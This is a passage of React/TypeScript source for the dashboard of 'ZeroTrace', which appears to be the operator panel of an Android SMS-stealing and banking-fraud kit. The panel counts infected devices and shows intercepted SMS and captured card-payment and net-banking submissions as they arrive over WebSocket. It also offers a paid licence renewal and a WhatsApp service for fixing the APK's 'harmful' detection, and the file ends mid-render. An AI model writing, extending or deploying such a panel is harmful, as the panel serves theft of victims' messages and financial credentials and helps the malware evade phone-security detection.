import {
  useEffect,
  useMemo,
  useRef,
  useState,
  useCallback,
  memo,
  useDeferredValue,
  useTransition,
} from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import wsService from "../services/ws/wsService";
import { listSessions } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import CountDown from "../components/ui/CountDown";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";

import ztLogo from "../assets/zt-logo.png";
import { formatDMY, getCountdown, getLicenseSnapshot, pad2 } from "../utils/license";
import {
  pickLastSeenAt,
  computeReachability,
  formatLastSeenAgo,
} from "../utils/reachability";

/* ═══════════════════════════════════════════════════════════
   Types — unchanged
   ═══════════════════════════════════════════════════════════ */

type Device = {
  deviceId: string;
  lastSeen?: { at?: number; action?: string; battery?: number };
  status?: { online?: boolean; timestamp?: number };
  admins?: string[];
  forwardingSim?: string;
  favorite?: boolean;
  metadata?: Record<string, any>;
};

type ActivityItem = {
  id: string;
  ts: number;
  title: string;
  subtitle?: string;
  icon: string;
  kind: "session" | "ws";
};

type SessionLike = {
  _id?: string;
  deviceId?: string;
  uniqueid?: string;
  admin?: string;
  username?: string;
  lastSeen?: number | string;
  updatedAt?: number | string;
  createdAt?: number | string;
};

type NotificationsSummaryResponse = {
  totalDevices?: number;
  totalSms?: number;
  latestTimestamp?: number;
};

type FormsSummaryResponse = {
  formsCount?: number;
  cardPaymentsCount?: number;
  netBankingCount?: number;
};

/* ═══════════════════════════════════════════════════════════
   Pure helpers — unchanged logic, zero allocation on hot path
   ═══════════════════════════════════════════════════════════ */

function toTs(v: any): number {
  if (!v) return 0;
  if (typeof v === "number") return v;
  const t = new Date(String(v)).getTime();
  return Number.isFinite(t) ? t : 0;
}

function minutesAgo(ts: number): string {
  const diff = Date.now() - ts;
  const m = Math.max(0, Math.floor(diff / 60000));
  if (m < 1) return "now";
  if (m === 1) return "1 min";
  if (m < 60) return `${m} min`;
  const h = Math.floor(m / 60);
  if (h === 1) return "1 hour";
  if (h < 24) return `${h} hours`;
  const d = Math.floor(h / 24);
  return d === 1 ? "1 day" : `${d} days`;
}

function onlyDigits(v: string): string {
  return String(v || "").replace(/\D/g, "");
}

function buildWhatsappUrl(base: string, text: string): string {
  const raw = String(base || "").trim();
  const encoded = encodeURIComponent(text);

  if (!raw) return "";

  if (/^\+?\d{8,20}$/.test(raw)) {
    return `https://wa.me/${onlyDigits(raw)}?text=${encoded}`;
  }

  try {
    const hasProtocol = /^https?:\/\//i.test(raw);
    const url = new URL(hasProtocol ? raw : `https://${raw}`);
    const host = url.hostname.toLowerCase();

    if (host.includes("wa.me")) {
      const phone = onlyDigits(url.pathname);
      if (phone) return `https://wa.me/${phone}?text=${encoded}`;
    }

    if (host.includes("api.whatsapp.com") || host.includes("web.whatsapp.com") || host.includes("whatsapp.com")) {
      const phone = onlyDigits(url.searchParams.get("phone") || url.pathname);
      if (phone) return `https://api.whatsapp.com/send?phone=${phone}&text=${encoded}`;
    }

    const phoneFromRaw = onlyDigits(raw);
    if (phoneFromRaw.length >= 8) {
      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
    }
  } catch {
    const phoneFromRaw = onlyDigits(raw);
    if (phoneFromRaw.length >= 8) {
      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
    }
  }

  return "";
}

/* ═══════════════════════════════════════════════════════════
   SMOOTH CSS — GPU-accelerated transitions injected once
   ═══════════════════════════════════════════════════════════ */

const SMOOTH_STYLE_ID = "zt-dashboard-smooth";

function injectSmoothStyles() {
  if (document.getElementById(SMOOTH_STYLE_ID)) return;
  const style = document.createElement("style");
  style.id = SMOOTH_STYLE_ID;
  style.textContent = `
    /* GPU-layer promotion for all interactive cards */
    .zt-gpu {
      transform: translateZ(0);
      backface-visibility: hidden;
      -webkit-font-smoothing: subpixel-antialiased;
    }

    /* Buttery smooth transitions for every interactive element */
    .zt-smooth-card {
      transition: transform 220ms cubic-bezier(.22,.68,0,1.2),
                  box-shadow 220ms cubic-bezier(.22,.68,0,1),
                  background-color 160ms ease,
                  opacity 200ms ease;
      will-change: transform;
    }
    .zt-smooth-card:hover {
      transform: translateY(-1px) scale(1.005);
      box-shadow: 0 10px 32px rgba(15,23,42,0.10);
    }
    .zt-smooth-card:active {
      transform: scale(0.985);
      transition-duration: 80ms;
    }

    /* Stat tile specific */
    .zt-stat-tile {
      transition: transform 200ms cubic-bezier(.22,.68,0,1.15),
                  box-shadow 200ms ease,
                  background-color 140ms ease;
      will-change: transform;
    }
    .zt-stat-tile:hover {
      transform: translateY(-2px) scale(1.012);
      box-shadow: 0 12px 36px rgba(15,23,42,0.10);
    }
    .zt-stat-tile:active {
      transform: scale(0.97);
      transition-duration: 70ms;
    }

    /* Activity / favorite rows */
    .zt-row-item {
      transition: transform 180ms cubic-bezier(.22,.68,0,1.1),
                  background-color 120ms ease,
                  box-shadow 180ms ease;
      will-change: transform;
    }
    .zt-row-item:hover {
      transform: translateX(3px);
      box-shadow: 0 4px 16px rgba(15,23,42,0.06);
    }
    .zt-row-item:active {
      transform: scale(0.98);
      transition-duration: 60ms;
    }

    /* Buttons */
    .zt-btn {
      transition: transform 160ms cubic-bezier(.22,.68,0,1.1),
                  background-color 120ms ease,
                  box-shadow 160ms ease,
                  opacity 120ms ease;
      will-change: transform;
    }
    .zt-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 14px rgba(15,23,42,0.08);
    }
    .zt-btn:active {
      transform: scale(0.97);
      transition-duration: 60ms;
    }

    /* Surface card entrance animation */
    .zt-surface-enter {
      animation: ztSurfaceIn 400ms cubic-bezier(.22,.68,0,1) both;
    }
    @keyframes ztSurfaceIn {
      from { opacity: 0; transform: translateY(12px) scale(0.98); }
      to   { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* Stagger children for smooth cascade load */
    .zt-stagger > * {
      animation: ztFadeUp 350ms cubic-bezier(.22,.68,0,1) both;
    }
    .zt-stagger > *:nth-child(1) { animation-delay: 0ms; }
    .zt-stagger > *:nth-child(2) { animation-delay: 50ms; }
    .zt-stagger > *:nth-child(3) { animation-delay: 100ms; }
    .zt-stagger > *:nth-child(4) { animation-delay: 150ms; }
    .zt-stagger > *:nth-child(5) { animation-delay: 200ms; }
    .zt-stagger > *:nth-child(6) { animation-delay: 250ms; }
    .zt-stagger > *:nth-child(7) { animation-delay: 300ms; }
    .zt-stagger > *:nth-child(8) { animation-delay: 350ms; }
    @keyframes ztFadeUp {
      from { opacity: 0; transform: translateY(10px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* Smooth counter value changes */
    .zt-value-pop {
      transition: transform 250ms cubic-bezier(.22,.68,0,1.3);
    }

    /* WS status dot pulse */
    .zt-pulse-live {
      animation: ztPulseLive 2s ease-in-out infinite;
    }
    @keyframes ztPulseLive {
      0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.45); }
      50%      { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
    }

    /* Smooth scroll for the whole page */
    .zt-smooth-scroll {
      scroll-behavior: smooth;
      -webkit-overflow-scrolling: touch;
      overscroll-behavior-y: contain;
    }

    /* Countdown digits smooth update */
    .zt-digit {
      display: inline-block;
      transition: transform 300ms cubic-bezier(.22,.68,0,1.2), opacity 200ms ease;
    }
  `;
  document.head.appendChild(style);
}

/* ═══════════════════════════════════════════════════════════
   Memoized sub-components — prevent needless re-renders
   ═══════════════════════════════════════════════════════════ */

const SurfaceCard = memo(function SurfaceCard({
  children,
  className = "",
  stagger = false,
}: {
  children: React.ReactNode;
  className?: string;
  stagger?: boolean;
}) {
  return (
    <div
      className={[
        "rounded-[26px] border border-slate-200/90 bg-white/90 shadow-[0_8px_28px_rgba(15,23,42,0.08)] backdrop-blur-sm zt-gpu zt-surface-enter",
        stagger ? "zt-stagger" : "",
        className,
      ]
        .filter(Boolean)
        .join(" ")}
    >
      {children}
    </div>
  );
});

const SectionHeader = memo(function SectionHeader({
  title,
  right,
}: {
  title: string;
  right?: React.ReactNode;
}) {
  return (
    <div className="flex items-center justify-between border-b border-slate-200 px-4 py-3">
      <div className="text-sm font-bold text-slate-900">{title}</div>
      {right}
    </div>
  );
});

const StatTile = memo(function StatTile({
  title,
  value,
  icon,
  hint,
  onClick,
}: {
  title: string;
  value: string | number;
  icon: string;
  hint: string;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="zt-stat-tile zt-gpu w-full rounded-[22px] border border-slate-200 bg-white/92 px-3 py-3 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)]"
    >
      <div className="flex items-center justify-between gap-3">
        <div className="flex min-w-0 items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-lg">
            {icon}
          </div>
          <div className="min-w-0">
            <div className="truncate text-[11px] text-slate-500">{title}</div>
            <div className="zt-value-pop text-xl font-extrabold leading-tight text-slate-900">{value}</div>
          </div>
        </div>
        <div className="text-xl text-slate-300">›</div>
      </div>
      <div className="mt-1 text-[10px] text-slate-400">{hint}</div>
    </button>
  );
});

const ActivityRow = memo(function ActivityRow({
  item,
  onClick,
}: {
  item: ActivityItem;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="zt-row-item zt-gpu flex w-full items-center justify-between rounded-[18px] border border-slate-200 bg-white px-3 py-2 text-left"
      title="Manage sessions"
    >
      <div className="flex min-w-0 items-center gap-2">
        <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">
          {item.icon}
        </div>
        <div className="min-w-0">
          <div className="truncate text-sm font-medium text-slate-900">{item.title}</div>
          <div className="truncate text-[11px] text-slate-500">
            {item.kind === "session" ? `admin: ${item.subtitle || "admin"}` : item.subtitle || "event"}
          </div>
        </div>
      </div>
      <div className="text-xs text-slate-400">{item.ts ? minutesAgo(item.ts) : ""}</div>
    </button>
  );
});

const FavoriteRow = memo(function FavoriteRow({
  id,
  device,
  onClick,
}: {
  id: string;
  device: Device | undefined;
  onClick: () => void;
}) {
  const ts = pickLastSeenAt(device);
  const reachability = computeReachability(ts);

  return (
    <button
      type="button"
      onClick={onClick}
      className="zt-row-item zt-gpu flex w-full items-center justify-between rounded-[18px] border border-slate-200 bg-white px-3 py-2 text-left"
    >
      <div className="flex min-w-0 items-center gap-2">
        <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">⭐</div>
        <div className="min-w-0">
          <div className="truncate text-sm font-medium text-slate-900">{id}</div>
          <div className="truncate text-[11px] text-slate-500">{reachability}</div>
        </div>
      </div>
      <div className="text-xs text-slate-400">{ts ? formatLastSeenAgo(ts) : ""}</div>
    </button>
  );
});

const FormRow = memo(function FormRow({
  icon,
  label,
  value,
}: {
  icon: string;
  label: string;
  value: number | null;
}) {
  return (
    <div className="flex items-center justify-between">
      <div className="flex items-center gap-2 text-sm">
        <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">{icon}</span>
        <span className="text-slate-700">{label}</span>
      </div>
      <div className="zt-value-pop text-sm font-semibold text-slate-900">{value == null ? "…" : value}</div>
    </div>
  );
});

/* ═══════════════════════════════════════════════════════════
   Countdown sub-component — isolated 1 Hz re-render
   Only this component re-renders every second, NOT the whole page
   ═══════════════════════════════════════════════════════════ */

const LiveCountdown = memo(function LiveCountdown({
  onRenewClick,
}: {
  onRenewClick: () => void;
}) {
  const [nowTick, setNowTick] = useState(() => Date.now());

  useEffect(() => {
    let raf: number;
    let last = Date.now();

    const tick = () => {
      const now = Date.now();
      // Only update state once per second (not every frame)
      if (now - last >= 1000) {
        last = now;
        setNowTick(now);
      }
      raf = requestAnimationFrame(tick);
    };
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, []);

  const license = useMemo(() => getLicenseSnapshot(nowTick), [nowTick]);
  const countdown = useMemo(() => getCountdown(license.expiryDate, nowTick), [license.expiryDate, nowTick]);

  return (
    <>
      <div className="flex items-center justify-between">
        <div className="text-xs text-slate-500">Active until:</div>
        <div className="text-xs font-medium text-slate-800">{formatDMY(license.expiryDate)}</div>
      </div>
      <div className="mt-2 flex items-center justify-between">
        <div className="text-xs text-slate-500">Purchase date:</div>
        <div className="text-xs font-medium text-slate-800">{formatDMY(license.startDate)}</div>
      </div>
      <div className="pt-4">
        {countdown ? (
          countdown.expired ? (
            <div className="rounded-[22px] border border-rose-200 bg-rose-50 p-4 text-center">
              <div className="text-2xl font-bold text-rose-600">Expired</div>
              <div className="mt-1 text-xs text-slate-500">Please renew license</div>
              <button
                type="button"
                onClick={onRenewClick}
                className="zt-btn mt-3 w-full rounded-xl border border-rose-200 bg-white py-2 font-semibold text-rose-700 hover:bg-rose-100"
              >
                Renew Now (Telegram)
              </button>
              <div className="mt-2 text-center text-xs text-slate-500">
                Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span>
              </div>
            </div>
          ) : (
            <div className="rounded-[22px] border border-slate-200 bg-slate-50 p-4">
              <div className="flex items-end justify-center gap-2 text-[22px] font-semibold tracking-wide sm:text-[34px]">
                <span className="zt-digit text-[28px] text-slate-900 sm:text-[36px]">{pad2(countdown.days)}</span>
                <span className="text-slate-300">:</span>
                <span className="zt-digit text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.hours)}</span>
                <span className="text-slate-300">:</span>
                <span className="zt-digit text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.mins)}</span>
                <span className="text-slate-300">:</span>
                <span className="zt-digit text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.secs)}</span>
                <span className="pb-1 text-sm text-slate-500">Sec</span>
              </div>
              <div className="mt-2 text-center text-xs text-slate-500">Days until {formatDMY(license.expiryDate)}</div>
              <button
                type="button"
                onClick={onRenewClick}
                className="zt-btn mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100"
              >
                Renew License (Telegram)
              </button>
              <div className="mt-2 text-center text-xs text-slate-500">
                Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span>
              </div>
            </div>
          )
        ) : (
          <div className="py-4 text-center text-sm text-slate-400">
            Set env <span className="font-medium text-slate-700">VITE_RENEWAL_START_DATE</span> (DD/MM/YYYY).
          </div>
        )}
      </div>
    </>
  );
});

/* ═══════════════════════════════════════════════════════════
   Main Dashboard — optimized
   ═══════════════════════════════════════════════════════════ */

export default function DashboardPage() {
  const nav = useNavigate();

  const [devices, setDevices] = useState<Device[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [formsCount, setFormsCount] = useState<number | null>(null);
  const [cardCount, setCardCount] = useState<number | null>(null);
  const [netbankingCount, setNetbankingCount] = useState<number | null>(null);
  const [smsCount, setSmsCount] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);

  const [wsConnected, setWsConnected] = useState<boolean>(false);

  const [sessionActivity, setSessionActivity] = useState<ActivityItem[]>([]);
  const [realtimeActivity, setRealtimeActivity] = useState<ActivityItem[]>([]);

  // License snapshot for non-countdown usages (harmfull section etc.)
  const licenseRef = useRef(getLicenseSnapshot(Date.now()));

  // Deferred devices for non-critical derived state — avoids jank on rapid WS bursts
  const deferredDevices = useDeferredValue(devices);

  const harmfullWhatsappLink = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();

  const smsCountRef = useRef<number | null>(null);
  const formsCountRef = useRef<number | null>(null);
  const cardCountRef = useRef<number | null>(null);
  const netCountRef = useRef<number | null>(null);

  const totalDevices = deferredDevices.length;

  const responsiveCount = useMemo(
    () => deferredDevices.filter((d) => computeReachability(pickLastSeenAt(d)) === "responsive").length,
    [deferredDevices],
  );
  const idleCount = useMemo(
    () => deferredDevices.filter((d) => computeReachability(pickLastSeenAt(d)) === "idle").length,
    [deferredDevices],
  );
  const unreachableCount = totalDevices - responsiveCount - idleCount;

  const favoriteIds = useMemo(() => {
    return Object.entries(favoritesMap)
      .filter(([, v]) => !!v)
      .map(([k]) => k)
      .sort((a, b) => (a > b ? 1 : -1));
  }, [favoritesMap]);

  const favoritesPreview = useMemo(() => favoriteIds.slice(0, 4), [favoriteIds]);

  const activityItems = useMemo(() => {
    const merged = [...realtimeActivity, ...sessionActivity];
    const seen = new Set<string>();
    const out: ActivityItem[] = [];

    for (const it of merged) {
      const bucket = Math.floor(it.ts / 30000);
      const key = `${it.kind}|${it.title}|${it.subtitle || ""}|${bucket}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push(it);
      if (out.length >= 6) break;
    }

    return out;
  }, [realtimeActivity, sessionActivity]);

  useEffect(() => { smsCountRef.current = smsCount; }, [smsCount]);
  useEffect(() => { formsCountRef.current = formsCount; }, [formsCount]);
  useEffect(() => { cardCountRef.current = cardCount; }, [cardCount]);
  useEffect(() => { netCountRef.current = netbankingCount; }, [netbankingCount]);

  // Inject smooth CSS once
  useEffect(() => {
    injectSmoothStyles();
  }, []);

  /* ── Stable callbacks for navigation ── */
  const goDevices = useCallback(
    (filter: "all" | "responsive" | "unreachable") => {
      if (filter === "all") {
        nav("/devices");
        return;
      }
      const qp = filter === "responsive" ? "online" : "offline";
      nav(`/devices?filter=${qp}`, { state: { filter: qp } as any });
    },
    [nav],
  );

  const goResponsive = useCallback(() => goDevices("responsive"), [goDevices]);
  const goUnreachable = useCallback(() => goDevices("unreachable"), [goDevices]);
  const goAllDevices = useCallback(() => goDevices("all"), [goDevices]);
  const goSms = useCallback(() => nav("/sms"), [nav]);
  const goForms = useCallback(() => nav("/forms"), [nav]);
  const goSessions = useCallback(() => nav("/sessions"), [nav]);
  const goFavorites = useCallback(() => nav("/favorites"), [nav]);
  const goDevice = useCallback((id: string) => nav(`/devices/${encodeURIComponent(id)}`), [nav]);

  const handleRenewClick = useCallback(() => {
    const license = licenseRef.current;
    if (license.telegramChatDeepLink) window.open(license.telegramChatDeepLink, "_blank");
    window.open(license.telegramShareUrl, "_blank");
  }, []);

  const handleHarmfullClick = useCallback(() => {
    const license = licenseRef.current;
    const panelId = String(license.panelId || "____").trim();
    const message = `hello sir fixmy harmfull\npanel id: ${panelId}`;
    const finalUrl = buildWhatsappUrl(harmfullWhatsappLink, message);
    if (!finalUrl) {
      console.warn("Invalid WhatsApp env link.");
      return;
    }
    window.open(finalUrl, "_blank", "noopener,noreferrer");
  }, [harmfullWhatsappLink]);

  /* ── Data loaders — stable via useCallback ── */
  const loadDevices = useCallback(async () => {
    setError(null);
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/devices`, { headers: apiHeaders(), timeout: 8000 });
      setDevices(Array.isArray(res.data) ? res.data : []);
    } catch (e: any) {
      console.error("loadDevices error", e);
      setError("Failed loading devices");
      setDevices([]);
    }
  }, []);

  const loadFavorites = useCallback(async () => {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders(), timeout: 8000 });
      const m = res?.data && typeof res.data === "object" ? (res.data as Record<string, boolean>) : {};
      setFavoritesMap(m || {});
    } catch {
      setFavoritesMap({});
    }
  }, []);

  const loadFormsSummary = useCallback(async () => {
    try {
      const res = await axios.get<FormsSummaryResponse>(`${ENV.API_BASE}/api/dashboard/forms-summary`, {
        headers: apiHeaders(),
        timeout: 10000,
      });
      setFormsCount(Number(res.data?.formsCount || 0));
      setCardCount(Number(res.data?.cardPaymentsCount || 0));
      setNetbankingCount(Number(res.data?.netBankingCount || 0));
    } catch {
      setFormsCount(0);
      setCardCount(0);
      setNetbankingCount(0);
    }
  }, []);

  const loadSmsSummary = useCallback(async () => {
    try {
      const res = await axios.get<NotificationsSummaryResponse>(`${ENV.API_BASE}/api/notifications/summary`, {
        headers: apiHeaders(),
        timeout: 10000,
      });
      setSmsCount(Number(res.data?.totalSms || 0));
    } catch {
      setSmsCount(0);
    }
  }, []);

  const loadAdminSessions = useCallback(async () => {
    try {
      const sessions = (await listSessions()) as any[];
      const arr: SessionLike[] = Array.isArray(sessions) ? sessions : [];

      const items: ActivityItem[] = arr
        .map((s) => {
          const did = String(s.deviceId || s.uniqueid || "unknown");
          const admin = String(s.admin || s.username || "admin");
          const last = toTs(s.lastSeen) || toTs(s.updatedAt) || toTs(s.createdAt) || Date.now();

          return {
            id: String(s._id || `${did}_${admin}_${last}`),
            ts: last,
            title: did,
            subtitle: admin,
            icon: "👤",
            kind: "session",
          } satisfies ActivityItem;
        })
        .sort((a, b) => b.ts - a.ts)
        .slice(0, 6);

      setSessionActivity(items);
    } catch (e) {
      console.warn("loadAdminSessions failed", e);
      setSessionActivity([]);
    }
  }, []);

  /* ── Realtime push — stable ref ── */
  const pushRealtime = useCallback((item: Omit<ActivityItem, "id" | "kind">) => {
    const next = {
      ...item,
      kind: "ws",
      id: `${Date.now()}_${Math.random().toString(16).slice(2)}`,
    } satisfies ActivityItem;
    setRealtimeActivity((prev) => [next, ...prev].slice(0, 6));
  }, []);

  /* ── Device lastSeen handler — stable ── */
  const applyDeviceLastSeen = useCallback(
    (deviceId: string, lastSeenAt: number, action?: string, battery?: number) => {
      setDevices((prev) => {
        let found = false;
        const next = prev.map((d) => {
          if (String(d.deviceId || "") !== deviceId) return d;
          found = true;
          return {
            ...d,
            lastSeen: {
              at: lastSeenAt,
              action: action || d.lastSeen?.action || "",
              battery: typeof battery === "number" && battery >= 0 ? battery : d.lastSeen?.battery ?? -1,
            },
          };
        });

        if (found) return next;

        return [
          {
            deviceId,
            lastSeen: { at: lastSeenAt, action: action || "", battery: battery ?? -1 },
            metadata: {},
          },
          ...next,
        ];
      });
    },
    [],
  );

  /* ── WebSocket effect — uses stable callbacks ── */
  useEffect(() => {
    wsService.connect();
    setWsConnected(wsService.isConnected());

    const unsub = wsService.onMessage((msg) => {
      try {
        if (!msg) return;

        if (msg.type === "event" && (msg.event === "device:lastSeen" || msg.event === "device:upsert")) {
          const did = String(msg.deviceId || msg?.data?.deviceId || "");
          if (!did) return;

          const lastSeenData = msg?.data?.lastSeen || msg?.data;
          const lastSeenAt = Number(lastSeenData?.at || msg?.data?.timestamp || Date.now());
          const action = String(lastSeenData?.action || "").trim();
          const battery = typeof lastSeenData?.battery === "number" ? lastSeenData.battery : -1;

          applyDeviceLastSeen(did, lastSeenAt, action, battery);

          const reachability = computeReachability(lastSeenAt);
          pushRealtime({
            ts: Date.now(),
            title: did || "Device",
            subtitle: `${reachability} • ${action || "update"}`,
            icon: reachability === "responsive" ? "🟢" : reachability === "idle" ? "🟡" : "🔴",
          });
          return;
        }

        if (msg.type === "event" && msg.event === "status") {
          const did = String(msg.deviceId || "");
          const ts = Number(msg.data?.timestamp || Date.now());
          if (did) {
            applyDeviceLastSeen(did, ts, "ws_status");
          }
          return;
        }

        if (msg.type === "event" && msg.event === "notification") {
          const did = String(msg.deviceId || "");
          const bodyText = String(msg?.data?.body || "").trim();
          if (did) {
            setSmsCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
            pushRealtime({
              ts: Date.now(),
              title: did || "Device",
              subtitle: bodyText ? "sms received" : "sms",
              icon: "💬",
            });
          }
          return;
        }

        if (msg.type === "event" && msg.event === "notification:deleted") {
          setSmsCount((prev) => {
            if (typeof prev !== "number") return prev;
            return Math.max(0, prev - 1);
          });
          return;
        }

        if (msg.type === "event" && msg.event === "favorite:update") {
          const did = String(msg?.data?.deviceId || msg.deviceId || "").trim();
          if (!did) return;
          const favorite = !!msg?.data?.favorite;
          setFavoritesMap((prev) => ({ ...prev, [did]: favorite }));
          return;
        }

        if (msg.type === "event" && msg.event === "device:delete") {
          const did = String(msg?.data?.deviceId || msg.deviceId || "").trim();
          if (!did) return;
          setDevices((prev) => prev.filter((d) => String(d.deviceId || "") !== did));
          setFavoritesMap((prev) => {
            const copy = { ...prev };
            delete copy[did];
            return copy;
          });
          return;
        }

        if (msg.type === "event" && (msg.event === "form:new" || msg.event === "form:update" || msg.event === "form:created" || msg.event === "form_submissions:created")) {
          if (msg.event === "form:new" || msg.event === "form:created" || msg.event === "form_submissions:created") {
            setFormsCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
          }
          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
          if (did) {
            pushRealtime({ ts: Date.now(), title: did, subtitle: "form submit", icon: "🗂️" });
          }
          return;
        }

        if (msg.type === "event" && (msg.event === "payment:new" || msg.event === "payment:card_created" || msg.event === "card_payment:created")) {
          const method = String(msg?.data?.method || "").trim().toLowerCase();
          if (method === "card" || msg.event === "payment:card_created" || msg.event === "card_payment:created") {
            setCardCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
          } else if (method === "netbanking" || method === "net_banking") {
            setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
          }
          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
          if (did) {
            pushRealtime({
              ts: Date.now(),
              title: did,
              subtitle: method === "netbanking" || method === "net_banking" ? "net banking" : "card payment",
              icon: method === "netbanking" || method === "net_banking" ? "🏦" : "💳",
            });
          }
          return;
        }

        if (msg.type === "event" && (msg.event === "payment:netbanking_created" || msg.event === "net_banking:created")) {
          setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
          if (did) {
            pushRealtime({ ts: Date.now(), title: did, subtitle: "net banking", icon: "🏦" });
          }
          return;
        }

        if (msg.type === "event" && msg.event === "globalAdmin.update") {
          pushRealtime({ ts: Date.now(), title: "Global Admin", subtitle: "updated", icon: "📣" });
          return;
        }

        if (msg.type === "force_logout") {
          pushRealtime({ ts: Date.now(), title: "Session", subtitle: "force logout", icon: "🚪" });
        }
      } catch {
        // ignore
      }
    });

    const wsStatusHandler = (ev: any) => {
      try {
        setWsConnected(!!ev?.detail?.connected);
      } catch {
        /* ignore */
      }
    };
    window.addEventListener("zerotrace:ws", wsStatusHandler as any);

    return () => {
      unsub();
      window.removeEventListener("zerotrace:ws", wsStatusHandler as any);
    };
  }, [applyDeviceLastSeen, pushRealtime]);

  useEffect(() => {
    loadDevices();
    loadFormsSummary();
    loadFavorites();
    loadSmsSummary();
    loadAdminSessions();
  }, [loadDevices, loadFormsSummary, loadFavorites, loadSmsSummary, loadAdminSessions]);

  // Keep license ref fresh
  useEffect(() => {
    licenseRef.current = getLicenseSnapshot(Date.now());
  });

  /* ═══════════════════════════════════════════════════════════
     Render — structure identical, classes enhanced for smoothness
     ═══════════════════════════════════════════════════════════ */

  return (
    <AnimatedAppBackground>
      <div className="zt-smooth-scroll mx-auto max-w-[420px] px-3 pb-28 pt-4">
        <SurfaceCard className="p-4" stagger>
          {/* Header */}
          <div className="flex items-start justify-between pb-2">
            <div className="flex min-w-0 items-center gap-3">
              <img
                src={ztLogo}
                alt="ZeroTrace logo"
                className="h-10 w-10 rounded-xl border border-slate-200 bg-white object-contain"
                loading="eager"
                decoding="async"
              />
              <div className="min-w-0">
                <div className="truncate text-lg font-bold leading-tight text-slate-900">ZeroTrace</div>
                <div className="text-[11px] text-slate-500">Secure Admin Panel</div>
              </div>
            </div>

            <div className="flex items-center gap-2 text-xs">
              <span
                className={[
                  "inline-block h-2.5 w-2.5 rounded-full",
                  wsConnected ? "bg-emerald-500 zt-pulse-live" : "bg-rose-500",
                ].join(" ")}
              />
              <span
                className={`${wsConnected ? "text-emerald-700" : "text-rose-600"} text-[12px] font-medium`}
              >
                {wsConnected ? "Connected" : "Disconnected"}
              </span>
            </div>
          </div>

          {/* Stat tiles */}
          <div className="mt-3 grid grid-cols-2 gap-3">
            <StatTile
              title="Responsive"
              value={responsiveCount}
              icon="📶"
              hint="Last seen < 15 min"
              onClick={goResponsive}
            />
            <StatTile
              title="Unreachable"
              value={unreachableCount}
              icon="📴"
              hint="Last seen > 2 hours"
              onClick={goUnreachable}
            />
            <StatTile
              title="Total Devices"
              value={totalDevices}
              icon="📱"
              hint="Click to view all devices"
              onClick={goAllDevices}
            />
            <StatTile
              title="All SMS"
              value={smsCount == null ? "…" : smsCount}
              icon="💬"
              hint="Click to open SMS History"
              onClick={goSms}
            />
          </div>

          {/* License countdown — isolated re-render */}
          <SurfaceCard className="mt-4 overflow-hidden">
            <SectionHeader
              title="Admin Expires in"
              right={
                <button
                  type="button"
                  onClick={handleRenewClick}
                  className="zt-btn rounded-xl border border-sky-200 bg-sky-50 px-3 py-1.5 text-xs font-semibold text-sky-700 hover:bg-sky-100"
                >
                  Renew (Telegram)
                </button>
              }
            />
            <div className="px-4 py-3">
              <LiveCountdown onRenewClick={handleRenewClick} />
            </div>
          </SurfaceCard>

          {/* Harmfull section */}
          <SurfaceCard className="mt-4 overflow-hidden">
            <SectionHeader title="Fix My Apk Harmfull" />
            <div className="px-4 py-4">
              <div className="rounded-[20px] border border-amber-200 bg-amber-50 px-3 py-3">
                <div className="text-sm font-medium text-slate-800">Need help for harmful/fix issue?</div>
                <div className="mt-1 text-xs text-slate-500">
                  Click below and WhatsApp will open with auto message:
                  <span className="font-medium text-slate-700"> hello sir fixmy harmfull</span> + your panel id.
                </div>
              </div>
              <button
                type="button"
                onClick={handleHarmfullClick}
                disabled={!harmfullWhatsappLink}
                className="zt-btn mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100 disabled:cursor-not-allowed disabled:opacity-60"
              >
                contact Harmfull team
              </button>
              <div className="mt-2 text-center text-xs text-slate-500">
                Panel ID: <span className="font-medium text-slate-800">{licenseRef.current.panelId || "____"}</span>
              </div>
              {!harmfullWhatsappLink ? (
                <div className="mt-2 text-center text-xs text-rose-600">
                  Set env <span className="font-medium">VITE_HARMFULL_FIX_WP_LINK</span>
                </div>
              ) : null}
            </div>
          </SurfaceCard>

